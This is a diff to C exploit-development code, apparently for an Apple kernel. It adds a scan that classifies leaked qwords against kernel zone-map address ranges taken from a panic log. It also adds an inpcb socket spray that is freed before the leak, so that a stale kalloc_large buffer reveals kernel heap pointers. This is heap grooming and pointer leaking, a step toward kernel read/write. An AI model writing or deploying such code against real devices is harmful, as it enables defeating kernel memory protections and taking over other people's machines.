@@ -223,6 +223,39 @@ scan_buffer(const uint8_t *buf, size_t len)
     printf("[scan] other high-tag qwords        : %llu\n",
            (unsigned long long)tagged);
 
+    /* zone-map classification (bounds from the 25E253 panic log):
+     *   zone map 0xfffffe1010000000 - 0xfffffe3610000000
+     *   GEN0..3  0xfffffe1876000000 - 0xfffffe2fa6000000  (zalloc elems)
+     * inpcb elements were ASSUMED 0x400-aligned -- check that. */
+    {
+        uint64_t zm = 0, gen = 0, a8 = 0, a16 = 0, a400 = 0;
+        uint64_t gen_min = UINT64_MAX, gen_max = 0;
+        for (i = 0; i < nq; i++) {
+            uint64_t v;
+            memcpy(&v, buf + i * 8, sizeof(v));
+            if (v >= 0xfffffe1010000000ULL && v < 0xfffffe3610000000ULL) {
+                zm++;
+                if (v >= 0xfffffe1876000000ULL && v < 0xfffffe2fa6000000ULL) {
+                    gen++;
+                    if ((v & 7) == 0)     a8++;
+                    if ((v & 0xf) == 0)   a16++;
+                    if ((v & 0x3ff) == 0) a400++;
+                    if (v < gen_min) gen_min = v;
+                    if (v > gen_max) gen_max = v;
+                }
+            }
+        }
+        printf("[scan] zone-map-range qwords          : %llu\n",
+               (unsigned long long)zm);
+        printf("[scan] GEN0-3 (zalloc elem) range     : %llu "
+               "(8-aligned %llu, 16-aligned %llu, 0x400-aligned %llu)\n",
+               (unsigned long long)gen, (unsigned long long)a8,
+               (unsigned long long)a16, (unsigned long long)a400);
+        if (gen)
+            printf("[scan] GEN ptr span: 0x%016llx .. 0x%016llx\n",
+                   (unsigned long long)gen_min, (unsigned long long)gen_max);
+    }
+
     if (nk > 0) {
         size_t j, best_len = 0, best_start = 0;
 
@@ -375,6 +408,15 @@ main(int argc, char **argv)
         break;
     case SPRAY_INPCB:
         ispray = inpcb_spray_start(opt_count);
+        if (ispray == NULL)
+            goto out;
+        /* free BEFORE the leak, mirroring krw's order: the freed inpcb zone
+         * memory (with its le_next/le_prev pointers) is what we hope the
+         * stale kalloc_large buffer reuses / reveals */
+        fprintf(stderr, "[leak] sprayed %d sockets, freeing\n",
+                inpcb_spray_count(ispray));
+        inpcb_spray_destroy(ispray);
+        ispray = NULL;
         break;
     case SPRAY_NONE:
         break;
